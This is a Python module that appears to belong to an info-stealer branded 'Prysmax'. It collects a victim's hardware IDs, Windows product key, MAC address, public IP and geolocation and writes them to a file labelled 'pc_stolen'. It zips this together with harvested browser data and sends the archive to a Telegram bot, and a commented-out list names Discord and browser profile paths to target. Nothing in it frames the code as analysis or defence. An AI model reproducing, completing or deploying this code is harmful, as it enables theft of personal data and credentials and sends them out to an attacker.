import os
from utils.send_tele_bot import send_file
import shutil
import os
import requests
import platform as platform_module
import shutil
import uuid
import wmi
import psutil
import subprocess
import re
from . import user
import asyncio

class SaveData:
    def __init__(self, token, chat_id):
        self.root_path = user +'\\Documents\\Browser'
        self.file_send_to_telegram_name = 'Prysmax'
        self.token = token
        self.chat_id = chat_id
        if os.path.exists(self.root_path):
            shutil.rmtree(self.root_path)
        if not os.path.exists(self.root_path):
            os.mkdir(self.root_path)

    def save_file(self, browser_name, file_name, content):
        if not os.path.exists(os.path.join(self.root_path, browser_name)):
            os.mkdir(os.path.join(self.root_path, browser_name))
        if content is not None:
            open(os.path.join(self.root_path, browser_name, f'{file_name}.txt'), 'w', encoding='utf-8').write(content)

    def machine_info(self):
        mem = psutil.virtual_memory()
        c = wmi.WMI()
        for gpu in c.Win32_DisplayConfiguration():
            GPUm = gpu.Description.strip()

        current_machine_id = subprocess.check_output(
            'wmic csproduct get uuid').decode('utf-8').split('\n')[1].strip()
        try:
            with os.popen('wmic path softwarelicensingservice get OA3xOriginalProductKey') as process:
                resultado = process.read()
                clave_producto = resultado.split('\n')[1].strip()
        except Exception as e:
            clave_producto = str(e)

        # pc info
        mac_address = ':'.join(['{:02x}'.format(
            (uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])

        pc_name = platform_module.node()
        pc_os = platform_module.platform()
        pc_cpu = platform_module.processor()
        pc_hwid = current_machine_id
        pc_ram = mem.total / 1024**3
        pc_gpu = GPUm
        pc_key = clave_producto
        if pc_key == None:
            pc_key = "Nothing"

        # network info
        getip = requests.get("http://ip-api.com/json/").json()
        theip = getip["query"]
        ip = requests.get(f"http://ip-api.com/json/{theip}?fields=192511").json()
        ip_country = ip.get("country", "Error")
        ip_region = ip.get("regionName", "Error")
        ip_city = ip.get("city", "Error")
        ip_isp = ip.get("isp", "Error")
        ip_proxy = ip.get("proxy", "Error")
        tokens = []
        local = os.getenv("localAPPDATA")
        roaming = os.getenv("APPDATA")
        # paths = {
        #     "Discord": roaming + "\\Discord",
        #     "Discord Canary": roaming + "\\discordcanary",
        #     "Discord PTB": roaming + "\\discordptb",
        #     "Google Chrome": local + "\\Google\\Chrome\\User Data\\Default",
        #     "Opera": roaming + "\\Opera Software\\Opera Stable",
        #     "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        #     "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default",
        #     'Lightcord': roaming + "\\Lightcord",
        #     'Opera GX': roaming + "\\Opera Software\\Opera GX Stable",
        #     'Amigo': local + "\\Amigo\\User Data",
        #     'Torch': local + "\\Torch\\User Data",
        #     'Kometa': local + "\\Kometa\\User Data",
        #     'Orbitum': local + "\\Orbitum\\User Data",
        #     'CentBrowser': local + "\\CentBrowser\\User Data",
        #     'Sputnik': local + "\\Sputnik\\Sputnik\\User Data",
        #     'Chrome SxS': local + "\\Google\\Chrome SxS\\User Data",
        #     'Epic Privacy Browser': local + "\\Epic Privacy Browser\\User Data",
        #     'Microsoft Edge': local + "\\Microsoft\\Edge\\User Data\\Default",
        #     'Uran': local + "\\uCozMedia\\Uran\\User Data\\Default",
        #     'Iridium': local + "\\Iridium\\User Data\\Default\\local Storage\\leveld",
        #     'Firefox': roaming + "\\Mozilla\\Firefox\\Profiles",
        # }
        pc_stolen = f"""
    ¡Tool created by Nezuko!

╔
╠       Network Info🌐                 
╠  ╒  IP: {theip}
╠   ╒  Country: {ip_country}
╠    ╒  Region: {ip_region}
╠      ╒  City: {ip_city}
╠       ╒  Vpn: {ip_proxy}
╠         ╒  ISP: {ip_isp}
╠

╠     Machine Info 🖥 
╠  ╒ Pc Name: {pc_name}
╠    ╒ OS: {pc_os}
╠     ╒ CPU: {pc_cpu}
╠      ╒ HWID: {pc_hwid}
╠       ╒ RAM: {pc_ram}
╠        ╒ GPU: {pc_gpu}
╠         ╒ Windows Key: {pc_key}
        """
        with open(self.root_path + '\\information.txt', 'w', encoding='utf-8') as archivo:
            archivo.write(pc_stolen)
        zip_filename = f"{theip}_{ip_country}"
        zip_filename = re.sub(r'[<>:"/\\|?*]', '_', zip_filename)
        self.file_send_to_telegram_name = zip_filename

    async def send_data_to_server(self):
        self.machine_info()
        temp = f'{self.root_path}\\{self.file_send_to_telegram_name}'
        shutil.make_archive(temp, 'zip', self.root_path)
        file_path = f"{temp}.zip"
        await send_file(file_path, self.token, self.chat_id)
        os.remove(file_path)